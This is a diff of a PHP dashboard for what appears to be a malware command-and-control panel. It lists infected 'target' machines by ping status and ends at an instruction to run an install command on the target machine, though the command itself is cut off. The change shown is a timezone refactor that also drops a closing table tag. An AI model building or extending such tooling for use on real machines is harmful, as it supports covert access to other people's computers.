@@ -2,16 +2,15 @@
 
 use Kelvinho\Virus\Singleton\Header;
 use Kelvinho\Virus\Singleton\HtmlTemplate;
-use Kelvinho\Virus\Singleton\Timezone;
+use Kelvinho\Virus\Timezone\Timezone;
 use Kelvinho\Virus\User\User;
 use Kelvinho\Virus\Virus\Virus;
 use Kelvinho\Virus\Virus\VirusFactory;
 use function Kelvinho\Virus\formattedHash;
-use function Kelvinho\Virus\formattedTime;
 use function Kelvinho\Virus\formattedTimeSpan;
 use function Kelvinho\Virus\niceFileSize;
 
-function displayTable(array $virus_ids, array $visibleFields, VirusFactory $virusFactory, User $user) {
+function displayTable(array $virus_ids, array $visibleFields, VirusFactory $virusFactory, User $user, Timezone $timezoneObject) {
     $timezone = $user->getTimezone();
     if (count($virus_ids) === 0) { ?>
         <p>(No viruses)</p>
@@ -31,7 +30,7 @@ function displayTable(array $virus_ids, array $visibleFields, VirusFactory $viru
                     echo "<tr onclick = \"virusInfo('" . $virus->getVirusId() . "')\" style='cursor: pointer;' " . ($virus->isStandalone() ? "" : "class='w3-blue-grey w3-hover-dark-grey'") . ">";
                     echo in_array(0, $visibleFields) ? "<td>" . $virus->getName() . "</td>" : "";
                     echo in_array(1, $visibleFields) ? "<td>" . formattedHash($virus->getVirusId()) . "</td>" : "";
-                    echo in_array(2, $visibleFields) ? "<td>" . formattedTime($virus->getLastPing() + Timezone::getUnixOffset($timezone)) . " UTC $timezone</td>" : "";
+                    echo in_array(2, $visibleFields) ? "<td>" . $timezoneObject->display($timezone, $virus->getLastPing()) : "";
                     echo in_array(3, $visibleFields) ? "<td>" . niceFileSize($virus->usage()->getStatic()) . "</td>" : "";
                     echo in_array(4, $visibleFields) ? "<td class='w3-right-align'><button class=\"w3-btn w3-teal\" onclick=\"deleteVirus('" . $virus->getVirusId() . "')\">Delete</button></td>" : "";
                     echo "</tr>";
@@ -68,18 +67,18 @@ if ($user->isHold()) { ?>
 <h2>Active viruses</h2>
 <p>These are viruses that are still reporting back pretty quickly (less
     than <?php echo formattedTimeSpan(10 * VIRUS_PING_INTERVAL); ?>)</p>
-<?php displayTable($user->getViruses(Virus::VIRUS_ACTIVE), [0, 1, 2, 3, 4], $virusFactory, $user); ?>
+<?php displayTable($user->getViruses(Virus::VIRUS_ACTIVE), [0, 1, 2, 3, 4], $virusFactory, $user, $timezone); ?>
 <h2>Dormant viruses</h2>
 <p>These are viruses that don't report back, but most likely due to the target's computer being shut off for less
     than 2 days</p>
-<?php displayTable($user->getViruses(Virus::VIRUS_DORMANT), [0, 1, 2, 3, 4], $virusFactory, $user); ?>
+<?php displayTable($user->getViruses(Virus::VIRUS_DORMANT), [0, 1, 2, 3, 4], $virusFactory, $user, $timezone); ?>
 <h2>Lost viruses</h2>
 <p>These are viruses that don't report back for more than 2 days</p>
-<?php displayTable($user->getViruses(Virus::VIRUS_LOST), [0, 1, 2, 3, 4], $virusFactory, $user); ?>
+<?php displayTable($user->getViruses(Virus::VIRUS_LOST), [0, 1, 2, 3, 4], $virusFactory, $user, $timezone); ?>
 <h2>Expecting viruses</h2>
 <p>These are viruses that haven't reported back yet, but are expected to report soon. This is automatically
     triggered by accessing the entry point.</p>
-<?php displayTable($user->getViruses(Virus::VIRUS_EXPECTING), [0, 1, 3, 4], $virusFactory, $user); ?>
+<?php displayTable($user->getViruses(Virus::VIRUS_EXPECTING), [0, 1, 3, 4], $virusFactory, $user, $timezone); ?>
 <h2>Installing a new virus</h2>
 To install a new virus on a Windows computer, execute this command in the command prompt on the target machine:
 <pre class="codes"
